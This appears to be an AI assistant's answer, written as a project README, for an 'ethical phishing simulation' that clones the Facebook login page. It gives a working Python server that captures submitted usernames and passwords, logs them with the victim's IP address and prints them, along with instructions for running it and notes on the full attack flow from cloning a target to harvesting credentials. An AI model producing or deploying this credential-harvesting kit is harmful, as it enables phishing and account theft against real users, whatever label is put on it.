

### **Ethical Phishing Simulation: Facebook Login Page**

```python
class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/capture.php':
            post_data = self.rfile.read(content_length).decode('utf-8')
            parsed_data = urllib.parse.parse_qs(post_data)

            username = parsed_data.get(USERNAME_FIELD_NAME, [''])[0]
            password = parsed_data.get(PASSWORD_FIELD_NAME, [''])[0]

            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"[{timestamp}] IP: {self.client_address[0]} - User: {username}, Pass: {password}\n"

            with open(LOG_FILE, "a") as f:
                f.write(log_entry)

            print(f"[+] Captured: User: {username}, Pass: {password} (Logged to {LOG_FILE})")

    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

with socketserver.TCPServer(("", PORT), PhishingHandler) as httpd:
    print(f"[*] Starting phishing server on http://0.0.0.0:{PORT}")
    print(f"[*] Phishing page: http://0.0.0.0:{PORT}")
    print(f"[*] Captured credentials will be saved to: {LOG_FILE}")
    print("[*] Waiting for submissions... (Press Ctrl+C to stop)")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
```

---

### **4. Start the Server & Test**
Run the server from your terminal:

```bash
python3 server.py
```

1. Open a browser and navigate to `http://localhost:8000`.
2. Enter fake credentials, click **"Log In"**, and observe the captured data in your terminal and `logs/captured_credentials.txt` file.

---

### **Key Learnings & Accomplishments**
- **Social Engineering**: The project highlights how a visually convincing clone can be used to deceive users.
- **Attack Lifecycle**: Gained hands-on experience with the complete attack flow, from cloning a target to capturing credentials.
- **Server-Side Logic**: Developed a functional Python web server to serve static assets and capture form data.

---

### **Demo**
- **Static Image**:  
  ![Facebook Clone](https://github.com/melvincwng/facebook-clone/blob/master/images/fbclone.JPG)

- **Animated GIF**:  
  ![Facebook Clone GIF](https://github.com/melvincwng/facebook-clone/blob/master/images/fbclone.gif)

---

### **Extras**
There are **4 animated background images** available (spring, summer, autumn, winter). One of them will be randomly chosen when you load the webpage. Which one will you get? 😉  

--- 

Let me know if you'd like any further refinements!
